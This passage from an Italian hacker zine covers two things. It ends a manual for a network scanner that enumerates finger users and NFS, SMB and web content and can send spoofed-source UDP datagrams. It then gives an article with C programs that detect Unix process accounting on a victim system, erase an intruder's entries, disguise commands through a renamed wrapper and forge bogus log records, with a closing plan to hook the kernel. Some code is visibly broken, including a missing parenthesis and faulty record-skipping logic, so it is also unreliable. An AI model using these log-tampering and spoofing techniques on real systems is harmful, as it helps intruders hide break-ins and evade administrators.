RPC INFORMATiON FOUND! at 192.168.1.2 --> rpcbind

ACES HIGH END --> Mon Feb 15 18:58:45

Sembra chiaro che ha trovato rpcbind perche contiene la stringa rpc :)

1.4 FINGER Scanner
    --------------

- TCP Scan (per cercare le porte finger aperte)

Ormai non ve lo devo nemmeno dire:

./aces infile outfile 79 -nocmp

- USER Scan (Scanning per cercare utenti)

  ./aces in out finger -cmp
  Do you want to scan for a no-logged user (y/n)? y

Finger Service -->  NOT FOUND! at stargate
Finger Username --> FOUND! at grisu.cameretta.pig

STRING -> grisu
Login: grisu                             Name: Il Drago
Directory: /home/grisu                   Shell: /bin/bash
Office: cameretta
On since Wed Feb 17 14:35 (CET) on tty1   13 seconds idle
     (messages off)
On since Wed Feb 17 14:38 (CET) on tty2   1 minute 31 seconds idle
     (messages off)
On since Wed Feb 17 14:47 (CET) on tty4 (messages off)
New mail received Mon Feb 15 23:00 1999 (CET)
     Unread since Mon Feb 15 22:31 1999 (CET)
Plan:
Da grande faro' il POMPIERE

Finger Service -->  NOT FOUND! at 192.168.1.2

[aces.log]

ACES HIGH STARTED --> Wed Feb 17 14:50:58

============================================
| ACES HiGH SCANNER RUN IN CMP MODE STRING |
============================================

[PORT/SERViCE] ====> finger
[STRING]       ====> grisu
[SiMpLE FiLE]  ====> out

Finger Username FOUND at grisu.cameretta.pig!
Login: grisu                             Name: Il drago
Directory: /home/grisu                   Shell: /bin/bash
Office: cameretta
On since Wed Feb 17 14:35 (CET) on tty1   18 seconds idle
     (messages off)
On since Wed Feb 17 14:38 (CET) on tty2 (messages off)
On since Wed Feb 17 14:47 (CET) on tty4   2 minutes 53 seconds idle
     (messages off)
New mail received Mon Feb 15 23:00 1999 (CET)
     Unread since Mon Feb 15 22:31 1999 (CET)
Plan:
Da grande faro' il POMPIERE

ACES HIGH END --> Wed Feb 17 14:51:02

Uhmmm volete cercare se uno username e' su piu' sistemi... volete vedere
quanti pompieri ci sono ;))) questo e' il tipo di scan da usare.
Vediamo ora un altro modo...

- GREP Scan (uno scan per ricercare utenti/piani/progetti o altro che sono
	     online)

es.:  ./aces in out finger -cmp
     Do you want to scan for a no-logged user (y/n)? n
     STRING -> root

./aces rete.pig outz finger -cmp
ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

Do you want to scan for a no-logged user (y/n)?

STRING -> root
I will scan for " root " string

Finger Service -->  NOT FOUND! at 192.168.1.1
Finger Information --> FOUND! at 192.168.1.2
Login     Name      Tty  Idle  Login Time   Office     Office Phone
root      Admin     *1      6  Feb 19 11:42 cameretta
root      Admin     *2      1  Feb 19 11:45 cameretta
root      Admin     *3         Feb 19 11:46 cameretta
root      Admin     *4         Feb 19 11:53 cameretta
root      Admin     *6         Feb 19 12:16 cameretta

Finger Service -->  NOT FOUND! at 192.168.1.3

[aces.log]

ACES HIGH STARTED --> Fri Feb 19 12:16:58

============================================
| ACES HiGH SCANNER RUN IN CMP MODE STRING |
============================================

[PORT/SERViCE] ====> finger
[STRING]       ====> root
[SiMpLE FiLE]  ====> outz

Finger Information FOUND at 192.168.1.2 !
Login     Name      Tty  Idle  Login Time   Office     Office Phone
root      Admin     *1      6  Feb 19 11:42 cameretta
root      Admin     *2      1  Feb 19 11:45 cameretta
root      Admin     *3         Feb 19 11:46 cameretta
root      Admin     *4         Feb 19 11:53 cameretta
root      Admin     *6         Feb 19 12:16 cameretta

ACES HIGH END --> Fri Feb 19 12:17:24

1.5 NFS Scanner
    -----------

- Scan per visualizzare tutte le directory mountabili

./aces infile outfile nfs -nocmp

- Scan per ricercare stringhe (directory/condivisioni/everyone :) ecc...)
  
./aces infile outfile nfs -cmp

es.:

./aces infile outfile -cmp
STRING -> everyone

1.6 SAMBA Scanner
    -------------

- TCP Scan (per cercare host con NETBIOS)

./aces infile outfile 139 -nocmp

- Scan per visualizzare tutte le informazioni sulle directory condivise

./aces infile outfile smb -nocmp

- Scan a comparazione di stringa per cercare particolari caratteri
  (nome dir/condivisioni/versione Samba)

./aces infile outfile smb -cmp

es.: ./aces in out smb -cmp
     STRING -> share

1.7 WEB Scanner
    -----------

- TCP Scan (per cercare host con la porta 80 aperta)

./aces infile outfile 80 -nocmp

- Scan per cercare l'esistenza di un file negli hosts

./aces 1 ou1 web -cmp
ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

SCAN to find a web file (1)
SCAN to find a string in a web file (2)

ANSWER -> 1

- Scan per cercare una stringa su un file del web per tutti gli hosts

./aces 1 ou1 web -cmp
ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

SCAN to find a web file (1)
SCAN to find a string in a web file (2)

ANSWER -> 2

esempio di log ottenuto con questa modalita':

ACES HIGH STARTED --> Wed Feb 17 21:41:47

============================================
| ACES HiGH SCANNER RUN IN CMP MODE STRING |
============================================

[PORT/SERViCE] ====> web
[STRING]       ====> ed
[SiMpLE FiLE]  ====> ou1

[WEB FILE NAME]  ====> index.html

WEB FILE STRING FOUND at localhost !
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
 <HEAD>
  <TITLE>Test Page for Red Hat Linux's Apache Installation</TITLE>
 </HEAD>
<!-- Background white, links blue (unvisited), navy (visited), red (active) -->
 <BODY
  BGCOLOR="#FFFFFF"
  TEXT="#000000"
  LINK="#0000FF"
  ALINK="#FF0000"
 >

[...]

  <p align="center">
  <a href="http://www.redhat.com/"><img src="poweredby.gif" alt="[ Powered
by Red Hat Linux ]"></a>
  </p>
 </BODY>
</HTML>

ACES HIGH END --> Wed Feb 17 21:41:57

1.8 Altre novita'
    -------------

- Altre news

Ora e' possibile stabilire il timeout nel file aces.h (di default 15 sec)
Ora c'e' pure un'ottima gestione nel kill del programma (nel log verra'
visualizzato che il programma e' stato killato e segnera' l'ULTIMO IP SCANNATO
potete usare lo script "create" per generare una nuova lista.

- Altri tools

"create" serve per generare nuove liste di ip dopo un kill del programma.
Per <lastip> prendi dall'aces.log l'ultimo ip scannato.

create -> ./create <lastip> <oldlist> <newlist>
          ./create www.org.asm infile newlist

HOST2LIST serve per generare una lista da un'interrogazione al dns

host2list -> ./host2list <hostlist> <iplist>
             ./host2list hst aces.list

1.9 Conclusioni
    -----------

DISCLAIMER: In nessun modo mi ritengo responsabile per quello che fate con
questo programma, ne' tanto meno per la gente che non sa usarlo, l'ho
concepito a scopo "amministrativo", se poi mi ritrovo a pubblicarlo su una
zine underground... boh che ne so, probabilmente e' perche' la mia tendenza
e' quella :)

  SE TI PIACE QUESTO PROGRAMMA, SE PER UN MOTIVO O L'ALTRO SAI CHI SONO
                  E VUOI FARMI UN REGALO ( MA CHE SEI SCEMO? :)
   INVIAMi UNA BOTTIGLIA DI COCACOLA [PIENA] e TI SARO' GRATO PER TUTTA LA
                                VITA.... THX
                     NON ACCETTO SOLDI uhmmm e A COSA SERVONO?
SE F0SSi STATO JERRY GARCiA VI AVREI CHIESTO UNA FOGLIA DI MARIJUANA AHAHAH ;)

Una domanda che sorge spontanea:
Quando usare aces high e quando usare sWEETm+NT ?

Aces High non e' un tool per la sicurezza quindi lo potete usare quando non
cercate servizi vulnerabili e sulla vostra rete... che poi si possa usare
anche per cercare server bucabili ricordatevi che tale uso e' ILLEGALE!
Per la versatilita' di questo programma nessuno potra' mai dire che sia un
tool col fine dell'hacking...
Anche sWEETm+NT di sPIRIT e' LEGALE se usato a scopi amministrativi, se poi
sia con uno che con l'altro scanner smerdate log su sistemi sono affari
vostri.
           Alla fine di questo programma ho solo una cosa da dire:
                            LA SCENA ITALIANA VIVE!

2.0 Versione 2.7
    ------------

- Implementazione UDP

E' ora possibile mandare un datagramma ad una lista di ip su determinate porte
per vedere se sono vive.... il datagramma costruito e' lo stesso del file
arnudp.c reperibile in giro per la rete: questo perche' cosi' sono sicuro che
il casino e' limitato.

Qui le opzioni cmp e nocmp non hanno importanza perche' non avverra' una
comparazione di stringa... potete mettere -nocmp o -cmp tanto il risultato e'
sempre lo stesso...

es.:
./aces ../1 uudp udp -cmp
ACES HiGH SCANNER  by pIGpEN/S0FtPj'99

DESTINATION PORT -> 12
Your O.S. can spoof source ip
If you want to spoof it write 1 else write 0 > 1
Source IP -> stargate
Source PORT -> 10
STRING -> non ha importanza

ip.inesistente.com -> UDP DATAGRAM -> NOT SENT
192.168.1.2 -> UDP DATAGRAM -> SENT

45000026
12340000
ff110000
c0a80101
c0a80102
000a000c
00120000
31323334
35363738
3930

L'unica restrizione per lo spoofing e' che l'ip deve esistere...
Effettivamente questa funzione puo' causare casini... quindi evitate di
usarla se non sapete cosa fa...

Esempio di log:

============================================
| ACES HiGH SCANNER RUN IN CMP MODE STRING |
============================================

[PORT/SERViCE] ====> udp
[STRING]       ====> non
[SiMpLE FiLE]  ====> uudp

[UDP SOURCE IP]  ====> stargate

ACES HIGH NOTE: STRING FIELD IS NOT COMPARED IN UDP WAY !
stargate ---> UDP DATAGRAM SENT!

ip.inesistente.com -> can't resolve destination hostname
I can't send datagram

192.168.1.2 ---> UDP DATAGRAM SENT!

ACES HIGH END --> Sat Feb 20 15:36:37

Vi ricordo che per costruire un datagramma e mandarlo dovete essere root e che
se siete sotto SUNOS per compilare il codice dovete specificare
-lsocket -lnsl

Una piccola nota pure sul datagramma... se capite quello che c'e' scritto
su udp.c e se avete presente come funziona tale protocollo siete a cavallo :)
Potrete usare questo codice in maniera super bastarda... della serie l'host
spoofato potrebbe essere pingato da un'intera lista di ip con grosso piacere
di chi legge i log...

Le modifiche sono mooolto semplici...

pIGpEN


-----------------------------------[ ACCT ]-----------------------------------
--------------------------------[ bELFaghor ]---------------------------------
/*
	#include <sys/disclaimer.h>
	Questo articolo e' il risultato di un breve scambio epistolare
	avvenuto tra me e FuSyS. I 'meriti' di questo articolo volano
	pertanto anche a lui, che mi ha particolarmente incoraggiato nella
	scrittura di queste righe. A tale merito non dimentichiamo anche
	fratello SMaster.
	Si ricorda inoltre che l'articolo e' stato scritto a fini
	informativi ed educativi. Utilizzate le informazioni contenute
	come meglio credete. Nessuno di noi e' responsabile delle
	vostre azioni.
*/

In rima a tutti. Ancora una volta torniamo a parlare di LOG, ma questa volta
toccheremo un argomento preso con le pinze da molti: ACCT. E come diceva
FuSyS nell'articolo sui log in BFi2, "Questa puo' essere una brutta bestia".
Vediamo di fargli vedere chi e' il piu' cattivo eheh.
Per prima cosa, dove troviamo acct ? Beh acct e' un pacchetto a se' stante
quindi potrebbe essere presente su qualunque sistema operativo unix like;
posso dirvi pero' che lo troviamo in tutti i *BSD (l'ho trovato su
NetBSD 1.3, FreeBSD 2.2.8 e OpenBSD 2.4) e probabilmente anche in tutte le
distribuzioni di Linux (spesso non come pacchetto di default), ma non lo
troviamo di serie nei SunOS 4.x e 5.x. Percio' sempre in guardia :)
Questa brutta bestia logga, nel file specificato come argomento, tutti i
comandi lanciati dagli utenti, siano essi utenti normali o root (solitamente
il file in questione e' /var/log/pacct o /var/log/acct o percorsi simili -
nella Debian 2.0r3 e' /var/account/pacct).
Pecca di questo sistema di logging e' il fatto che viene loggato solamente
l'argv[0] e non gli argomenti/parametri passati: e per noi e' una
buona cosa :) eheh Il file contenente i log e' un file binario e per accedervi
abbiamo bisogno di leggere/scrivere da una struct che lo rappresenta. Definita
in acct.h, figura come segue:
	
struct acct
{
        char    ac_comm[ACCT_COMM];     /* Accounting command name */
        time_t  ac_utime;               /* Accounting user time */
        time_t  ac_stime;               /* Accounting system time */
        time_t  ac_etime;               /* Accounting elapsed time */
        time_t  ac_btime;               /* Beginning time */
        uid_t   ac_uid;                 /* Accounting user ID */
        gid_t   ac_gid;                 /* Accounting group ID */
        dev_t   ac_tty;                 /* controlling tty */
        char    ac_flag;                /* Accounting flag */
        long    ac_minflt;              /* Accounting minor pagefaults */
        long    ac_majflt;              /* Accounting major pagefaults */
        long    ac_exitcode;            /* Accounting process exitcode */
};

I commenti mi sembrano di una chiarezza solare enucleando limpidamente il
contenuto dei campi. Forse puo' apparire un po' oscuro il contenuto
di ac_flag...
Chiariamolo :) ... Viene, infatti, definito anch'esso in acct.h e appare come
segue:

	#define AFORK   0001    /* has executed fork, but no exec */
	#define ASU     0002    /* used super-user privileges */
	#define ACORE   0004    /* dumped core */
	#define AXSIG   0010    /* killed by a signal */

E direi che i commenti per ora sono esaustivi :) quindi possiamo
passare avanti...
Premettiamo che sia paranoico, quindi, per andare sul sicuro, anche se abbiamo
spulciato tutto l'hard disk della nostra carissima vittima senza aver trovato
nulla, mi assicurerei dell'assenza del pacchetto acct, attivo magari in una
qualche zona occultata, con questo breve codice (sempre che il sysadm non si
sia gia' prevenuto):

---------- snip ----------
/* stupid acct knocker */

#include <stdio.h>
#include <unistd.h>
#include <sys/acct.h>

#define BLAME_PATH "blame_it_on_god"

void main() {
        acct(BLAME_PATH);
        perror("acct");
}
---------- snip ----------

OK, che otteniamo? It's simple :) Se una volta lanciato, otterremo:
"acct: No such file or directory" allora vorra' dire che acct non sta girando
poiche' il nostro acct() ha tentato di attivarlo, ma senza riuscirci perche'
il file 'blame' non esiste (!), mentre se avremo:
"acct: Device or resource busy" allora vorra' dire che acct sta girando e
loggando da qualche parte...
Brutta cosa per noi :/ dovremo scovarlo... mmm volete un'idea?
Provate a cercare file come 'lastcomm, dumpacct, sa, acctentries' or something
like that e poi fargli un bel 'strings'; probabilmente troverete il percorso
del file in cui vanno a finirie i log :))
Ma parliamo di acct() dato che ve l'ho gia' quasi presentata ;) La funzione e'
presente in unistd.h - extern int acct __P ((__const char *__name)); - e
vuole come argomento una char che rappresenta il file in cui INIZIARE
a loggare; se lo poniamo a NULL acct termina di loggare. Nota che il file deve
esistere per iniziare a loggare, altrimenti tornera' un bel "no such file",
e nel caso in cui la dimensione del file e' diversa da 0 acct riprendera' a
loggare dal punto in cui aveva terminato.
Come valore di ritorno abbiamo, infine, un valore < 0 se la funzione non e'
andata a buon fine, con l'errore posto in errno, altrimenti 0.
Tale funzione viene, infatti, chiamata dal programma 'accton' per attivare o
terminare il logging (puo' non essere sempre questo il programma da lanciare,
ad esempio in SVr4 tale programma e' sostituito da /usr/lib/acct/startup).

OK. Ora qualcuno potrebbe pensare: perche' non nascoderci con una memset() dei
campi che ci interessano? ...Semplice :) proprio perche' non e' cosi' semplice
:) Criptico ma ci siamo capiti eheh. Vediamo, infatti, nei prg che troviamo
in "dotazione" nel pacchetto, del codice che non ci piace affatto...
In dumpacct.c troviamo (e in acctentries.c qualcosa di simile):

     fprintf (stdout, "%-*.*s %5d %5hd %5hd %5d %5ld %5.2f %5.2f %.19s\n",
              ((int) sizeof (ac->ac_comm)),
              ((int) sizeof (ac->ac_comm)), ac->ac_comm,
              ac->ac_tty, ac->ac_uid, ac-> ac_gid,
              (int) ac->ac_flag, ac->ac_exitcode,
              (double) ac->ac_utime / (double) AHZ,
              (double) ac->ac_stime / (double) AHZ,
              ctime(&ac->ac_btime));

Quindi, qualsiasi sia il contenuto dei campi, sia esso NULL o 0, viene sempre
e comunque stampato... :) Ovvero come farsi sgamare al primo colpo :)
Cosi' non va...
Allo stesso modo in lastcomm.c, altro prg in "dotazione" nel pacchetto,
troviamo:

         if (acp->ac_comm[0] == '\0')
            (void)strcpy(acp->ac_comm, "?");

            if (!isascii(*cp) || iscntrl(*cp))
               *cp = '?';

Con queste quattro righe, ci frega nuovamente: infatti, se ac_comm e' NULL
o e' un carattere di controllo oppure non e' un carattere ASCII, al campo
ac_comm (contente il comando passato in shell) verra' assegnato un '?';
niente di piu' sgamabile. Siamo proprio fuori strada :/

Ma ci deve essere una soluzione... noi siamo i piu' cattivi :) Beh io,
per iniziare, la metterei in questi termini (vedi codice); in seguito vedremo
i problemi che si creano e come risolverli o evitarli.

---------- snip ----------
/*
   Xytaxehedron v0.1
   "The Xytaxehedron held to the stars... the incantation uttered with eager
   tongues... (What long-shackled powers of the elder dark have our conjurings
   loosed?)"
   Startfire burning upon the ice-veiled throne of ultima thule, Bal Sagoth.
   coded by bELFaghor
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/acct.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>

#define ACF "/var/log/acct"

void main(int argc, char *argv[]) {
        int fdin, fdout;
        struct acct akt;
        struct passwd *p;

        if(argc != 2) {
                printf("ERR. syntax:\t%s <user>.\n", argv[0]);
                exit(1);
                }

        if((p = getpwnam(argv[1])) == NULL) {
                perror("getpwnam");
                exit(2);
                }

        if((fdin = open(ACF, O_RDONLY)) < 0) {
                perror("open acct");
                exit(3);
                }

        if((fdout = open("fackt.tmp", O_WRONLY|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR)) < 0) {
                perror("open fackt.tmp");
                exit(4);
        }

        while(read(fdin, &akt, sizeof(struct acct)) > 0) {
                if(akt.ac_uid != p->pw_uid) {
                        write(fdout, &akt, sizeof(struct acct));
                        }
        }
        close(fdin);
        close(fdout);

        system("/bin/mv fackt.tmp /var/log/acct");
        system("/bin/chmod 600 /var/log/acct");
        printf("puff.\n");
}
---------- snip ----------

Bello no? :)) L'abbiamo fottuto alla grande eheh.
Il codice come sempre mi sembra chiaro :) (beh direte... se non e' chiaro
a te a chi dev'essere chiaro?!? ahahah avete ragione :P) Dai, con un man
delle funzioni che non conoscete potete arrivarci :) In pratica cancelliamo
TUTTE le entries in un determinato user. E qui arrivano le grane.
Vediamo quali sono e come risolverle...
Per prima cosa, come abbiamo detto, cancelliamo TUTTE le entries dell'user...
e questo e' un male... dobbiamo cancellare SOLO le NOSTRE entries,
non le altre :) desteremmo troppi sospetti altrimenti...
Vediamo quindi i problemi che sorgono:

	1. blocchiamo il funzionamento di acct
	2. tutte le entries relative all'user vengono cancellate
	3. riduciamo la dimensioni del file

Punto 1 :) bisogna riavviare l'acct... quindi come spero avrete capito... alla
fine del nostro codice ci mettiamo un bel:

	        if (acct(NULL)) {
	                perror("acct NULL");
	                exit(1);
	        }
		if((acct(ACF)) < 0) {
			perror("acct ACF");
			exit(1);
			}

Ricordiamoci: prima dobbiamo disattivarlo per poi potere riattivarlo... :)
Ma un altro problema ci rogna :/ avremo una nuova entry, ovvero quella
dell'acct che e' stato riavviato, che visualizza il nome del nostro
programma...
Dobbiamo nasconderlo... :) aggiungiamo una strncpy() all'inizio del codice:
		
		strncpy(argv[0], "ls", 2);

Sistemato :)
Infatti non ci sono restrizioni per cambiare l'argv[0] :) chiunque puo' farlo
ahah e quindi perche' non sfruttarlo ? :) Ricordatevi di non mettere un
carattere nullo, altrimenti salterebbe tutto :)
OK. La nostra entry apparira' circa cosi':

*Comando*  *Flag* *User*   *TTY*		**** TIME ****
ls           S     root     tty2       60   0.01 secs Tue Feb D HH:MM:SS

Non male... Ma se il root non e' loggato??! Beh ci sara' quest'entry in piu'
che potrebbe destare qualche sospetto :/ quindi, speriamo bene :)
anche perche' non vedo il modo di ovviare a tale problema... se non
intervenendo a livello di codice del kernel alterando il funzionamento della
acct() oppure a livello di lkm :)

Veniamo al punto 2: tutte le entries relative all'user vengono cancellate.
Non mi sembra per niente una buona idea... almeno che non vogliamo essere
sgamati...
Come fare? Possiamo provare a togliere N log dall'ultimo relativi al nostro
utente... ma in un sistema con diverse centinaia di utenti, dove magari
il nostro utente e' loggato insieme a noi, sarebbe ben difficile riuscire a
togliere quelli giusti... Un'alternativa che ricade pero' nello stesso
impedimento e' quella di togliere i log in base a un determinato
tempo/orario... oppure oppure togliere determinati comandi... La vedrei come
una buona soluzione se pensiamo magari di implementare anche un block del
logging... ma appunto BUONA, non ottimale...
Infatti se facciamo girare un block a livello di software indipendente dal
kernel, questo ci blocchera' tutte le entries... e il root potrebbe
accorgersi che da un certo orario non ci sono stati log sebbene degli utenti
fossero loggati nel sistema... Una questione dubbia :) ...
Nel man di acct troviamo:
"NOTES
       No  accounting  is  produced  for  programs running when a
       crash occurs.  In particular, nonterminating processes are
       never accounted for."
No, non abbiamo risolto. Perche' o facciamo crashare il sistema operativo ogni
volta che lanciamo un programma prima che abbia terminato oppure non facciamo
terminare nessuno dei comandi che abbiamo lanciato: due assurdita'.
Non pensate nemmeno a mandare un SIGABRT ai nostri programmi cattivi perche'
ci sono le flag che ci fottono: l'entry viene cioe' ugualmente aggiunta e le
vengono aggiunte le flag 0004 e 0010, ovvero 'dumped core' e
'killed by signal'...
Beh che dirvi :) io una soluzione l'avrei... eheh sappiamo che acct logga
il nostro comando, ma non i suoi argomenti... inizialmente pensai che
scrivendo un breve codice che lanciasse il programma che volevo, potessi in
tal modo eludere il logging... Cioe' come abbiamo visto prima, facendo una
strcpy(argv[0], "ls");, faccio poi eseguire al mio codice il comando che
voglio e cosi' sono mascherato...
Soltanto che acct e' piu' furbo di noi... logga sia il codice che esegue il
programma che il programma stesso (quello chiamato dalla system())... quindi
se il mio programma si chiamasse PIPPO e lanciasse il programma PIPPA avrei
un log del genere...

pippa        S     root     tty2       60   0.01 secs Tue Feb D HH:MM:SS
pippo        S     root     tty2       60   0.01 secs Tue Feb D HH:MM:SS

(questo e' un output lastcomm like :) ma nel file di log le entry sono messe
in maniera opposta :)
In tal modo sembrerebbe che non ci siamo proprio :) ma non e' cosi'... Noi non
sappiamo gestire acct perche' e' troppo variabile :) Beh cosi' una "costante",
un punto di riferimento, l'abbiamo... ovvero il nostro PIPPO. Penso abbiate
gia' capito :) Il tutto sta nel lanciare i comandi attraverso il nostro 
"interprete" PIPPO e poi cancellare i log con una versione IMPROVED :) di
Xytaxehedron :)
Dai arriviamo al codice :) premetto che e' possibile scriverlo in diversi
modi... fork() e exec*() oppure popen() o anche system() :)
Vedete voi ;) 

---------- snip ----------
/*
  hydra v0.1
  The Beuty in Darkness
  coded by bELFaghor
*/

#include <stdio.h>
#include <unistd.h>

void main(int argc, char *argv[]) {
        char buf[1024];
        FILE *f;

        if(argc!=2) {
                printf("syntax:\t%s <command>\n", argv[0]);
                exit(1);
                }
        if((f = popen(argv[1], "w")) < 0) {
                perror("popen");
                exit(1);
                }
        fflush(f);
        if((pclose(f) < 0) < 0) {
                perror("pclose");
                exit(1);
                }

}
---------- snip ----------

Questo codice esegue un comando che gli passate come argomento. Diciamo che
effettua solo dei controlli minimali per mantere minima la sua dimensione...
anzi se volete potreste anche togliere i costrutti if :)
Ah un consiglio :) metteci come al solito una strcpy() magari con un comando
verosimile, chesso' 'hostnames', in modo tale che, anche se non avete ancora
cancellato i vostri log, non diano nell'occhio :)
(o anche piu' semplicemente rinominate il vostro eseguibile ;)

Ora veniamo all'altro codice, la versione IMPROVED, ovvero il codice che
cancella le entry in cui in ac_comm compare HYDRA e la entry successiva,
ovvero quello che in teoria, dovrebbe essere il comando eseguito da HYDRA:
in teoria, perche' in un sistema in cui molti utenti sono loggati, POTREBBE
non essere la vostra l'entry successiva :/
Quindi modificheremo il codice di Xytaxehedron in tal modo:

#define KSTR "hydra"

        while(read(fdin, &akt, sizeof(struct acct)) > 0) {
                if(strcmp(akt.ac_comm, KSTR)) {
                        write(fdout, &akt, sizeof(struct acct));
                        lseek(fdin, sizeof(struct acct), SEEK_CUR);
                        }
        }

E siamo CIRCA a posto :)
Per finire ecco il codice contente le sopra citate migliorie:

---------- snip ----------
/*
   Xytaxehedron v0.1i (IMPROVED)
   "The Xytaxehedron held to the stars... the incantation uttered with eager
   tongues... (What long-shackled powers of the elder dark have our conjurings
   loosed?)"
   Startfire burning upon the ice-veiled throne of ultima thule, Bal Sagoth.
   coded by bELFaghor
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/acct.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>

#define ACF "/var/log/acct"
#define KSTR "hydra"
#define FN "ls"

void main(int argc, char *argv[]) {
        int fdin, fdout;
        struct acct akt;

	strcpy(argv[0], FN);

        if((fdin = open(ACF, O_RDONLY)) < 0) {
                perror("open acct");
                exit(3);
                }

        if((fdout = open("fackt.tmp", O_WRONLY|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR) {
               perror("open fackt.tmp");
                exit(4);
        }

        while(read(fdin, &akt, sizeof(struct acct)) > 0) {
                if(strcmp(akt.ac_comm, KSTR)) {
                        write(fdout, &akt, sizeof(struct acct));
                        lseek(fdin, sizeof(struct acct), SEEK_CUR);
                        }
        }

        close(fdin);
        close(fdout);

        system("/bin/mv fackt.tmp /var/log/acct");
        system("/bin/chmod 600 /var/log/acct");
        printf("puff.\n");

	if (acct(NULL)) {
	        perror("acct NULL");
                exit(1);
        }
        if((acct(ACF)) < 0) {
                perror("acct ACF");
                exit(1);
        }

}
---------- snip ----------

Come avrete spero visto e' stato rimosso il controllo dell'username; in tal
modo cancelleremo tutte le 'nostre entry cattive' indifferentemente dall'user
che le ha generate :) cosicche' se vogliamo utilizzare HYDRA anche da non
root siamo liberi di farlo senza poi utilizzare due o piu' volte
Xytaxehedron ;) cmq se volete reimplementarlo, a voi :)

ACCT e' una gran brutta bestia, ma noi siamo peggio ;)

Ora per i piu' cattivi e vendicativi :) ma anche per i piu' giocherelloni :)
vediamo anche di scrivere del codice per modificare le entry e fare
impazzire il root :)
Questa volta senza scrivere e riscrivere il codice piu' volte, vediamo prima
la parte 'teorica' e poi implementiamo il tutto :) Infatti la parte teorica,
come d'altro canto anche la parte piu' strettamente 'pratica', e' abbastanza
semplice e limitata :) Infatti, partiamo dalla considerazione teorica che in
un sistema di logging come acct, in cui le entries sono davvero tante e
complesse, anziche' andare a modificare le entry tanto vale aggiungerne :)
Eheh gia' fatto...
Passiamo quindi alla parte pratica: il codice :)

---------- snip ----------
/*
   Leipzig v0.1
   This is a tribute to Dead, died by his own hands in April 1991.
   "Jag ar inte en manniska. Det har ar bara en drom, och snart vaknar jag.
    Det bar for kallt ech blodet lebrades hela tiden".
   coded by bELFaghor
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <acct.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>

/* see acct.h */
#define TCOMM   "fuckyoug0d"
#define TUSER   "corpse"

#define ACT "/var/log/acct"

void main() {
        int fi;
        struct acct akt;
        struct passwd *p;

        if((fi = open(ACT, O_APPEND|O_WRONLY)) < 0) {
                perror("open");
                exit(1);
                }

        if((p = getpwnam(TUSER)) == NULL) {
                perror("getpwnam");
                exit(1);
                }


        memset(&akt, 0, sizeof(struct acct));
        strcpy(akt.ac_comm, TCOMM);
        akt.ac_uid = p->pw_uid;
        akt.ac_gid = p->pw_gid;
        akt.ac_flag = ACORE;
        akt.ac_exitcode = 1;
        akt.ac_minflt = 1+(int) (10.0*rand()/(RAND_MAX+1.0));
        akt.ac_majflt = 1+(int) (10.0*rand()/(RAND_MAX+1.0));
        akt.ac_tty = 1028;
        akt.ac_utime = akt.ac_btime;
        akt.ac_stime = akt.ac_btime;

        if((write(fi, &akt, sizeof(struct acct))) < 0) {
                        perror("write");
                        exit(1);
                        }

        if(close(fi) < 0) {
                perror("close");
                exit(1);
                }

        printf("done - %s written.\n", TCOMM);
}
---------- snip ----------

Con questo codice aggiungiamo un'entry al file di log (direte: perche' solo
una? Che poi, se vogliamo mettercene di piu', dobbiamo continuamente editare e
compilare il codice? Semplice :) perche' questo e' un codice d'esempio che
nella sua natura vuole mantenersi snello e non appesantirsi di una getopt()
che prende argomenti alla linea di comando :))
Ho tralasciato la parte che riavvia l'acct... fate come meglio credete :)
E state attenti alla flag (ac_flag :)... anche se non sembra, e' molto
significativa...
Vammi tu a spiegare perche' un utente normale che ha lanciato un semplice 'ls'
ha la flag ASU (used super-user privileges) settata. Eheh siamo perfidi ahah.
Infatti perche' non mettere la flag ACORE (dumped core) al comando 'sendmail'?
Ahah :) mooolto perfidi :) ...
Fate attenzione a lanciare anche questo programma con HYDRA cosicche' potrete
poi cancellare la nuova entry che vi creera' :)

Eheh lo so cosa state pensando :) il punto 3. Il punto 3 non me lo sono
dimenticato... eccolo :P - l'unico caso in cui i sistemi con molti utenti ci
sono d'aiuto :)) -
Ricordatevi, infatti, che se l'amministratore di sistema mantiene un controllo
sulle dimensioni del file di log, e si accorge che voi le state riducendo per
togliere i vostri log... beh siete fatti :) perche' i file di log possono solo
crescere, non diminuire :)) Anche se come dice Phreak Accident in PHRACK 43:

"Most sysadmins don't pay real attention to the process logs, since they
do tend to be rather large and grow fast.  However, if they notice that a
break-in has occurred, this is one of the primary places they will look for
further evidence."

E ancora un'ultima cosa :) come abbiamo visto, i sistemi nei quali acct e'
un po' ostico da gestire sono quelli con molti utenti... Beh c'e' da dire
pero' che difficilmente in tali sistemi l'acct logging serve a qualche cosa
per l'admin, sempre escludendo la clausola sopra citata da Phreak Accident :)

Ora vediamo come potremmo risolvere la cosa sfruttando, invece, il kernel di
Linux: quanto segue e' percio' inerente solo ad un hack in ambiente Linux
ed e' stato per voi testato solo sul Kernel 2.0.36... meditate ragazzi,
meditate :) .
Come abbiamo detto in precedenza, due sono le vie da percorrere: o sfruttare
un LKM, ovvero un Loadable Kernel Modules, oppure intaccare il kernel vero e
proprio a livello dei sorgenti. Vediamole.
Innanzitutto dobbiamo vedere come il kernel gestisce il logging: in
/usr/src/linux/kernel/sys.c troviamo la ormai famosa
int sys_acct(const char *name), ma, come dovreste sapere, questa non e' la
funzione che ci interessa. Infatti, molto piu' interessante e' 
int acct_process(long exitcode) che trovate poco piu' sopra e che gestisce il
logging vero e proprio; sfortunatamente non e' una system call che possiamo
modificare con un LKM, MA da qualche parte in una sys_call sara' pur
chiamata :) Infatti, se spulciate per benino, troverete che viene chiamata da
void do_exit(long code) in /usr/src/linux/kernel/exit.c che, sebbene non sia
una sys_call, viene chiamata a sua volta, poco piu' sotto, da
int sys_exit(int error_code) che e' una chiamata di sistema :) quindi
modificabile. Percio' non dobbiamo fare altro che alterare il funzionamento
